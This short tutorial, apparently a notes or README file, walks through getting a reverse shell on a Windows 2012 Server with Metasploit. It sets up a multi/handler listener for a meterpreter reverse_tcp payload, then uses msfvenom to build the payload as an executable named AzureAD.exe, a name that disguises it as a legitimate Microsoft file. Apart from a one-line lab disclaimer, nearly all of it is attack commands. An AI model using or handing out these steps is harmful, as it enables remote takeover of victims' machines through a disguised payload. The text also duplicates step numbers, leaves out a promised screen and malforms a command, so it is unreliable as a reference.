### The following steps are provided to obtain a reverse shell on a Windows 2012 Server. The steps performed, were carried out in a secure environment. Please ensure, if you do choose to replicate this activity that you either do so as qualified practitioner or that you have a qualified practitioner with you.

# Step 1 : Create a reverse handler using metasploit. To do so, you run the following commands -
  *1.1 - sudo msfconsole
  *1.2 - use multi/handler
  *1.3 - configure payload (preferable : windows/meterpreter/rerverse_tcp)
  *1.4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on>
  *1.5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, it a disconnect from the client(victim). After doing so, you should see the following screen :
  
  
  *1.2 - (On a Kali Linux machine) sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP of Address of host> LPORT=<local port to listen on> -f <format> exe -o <output> ~/Downloads/AzureAD.exe
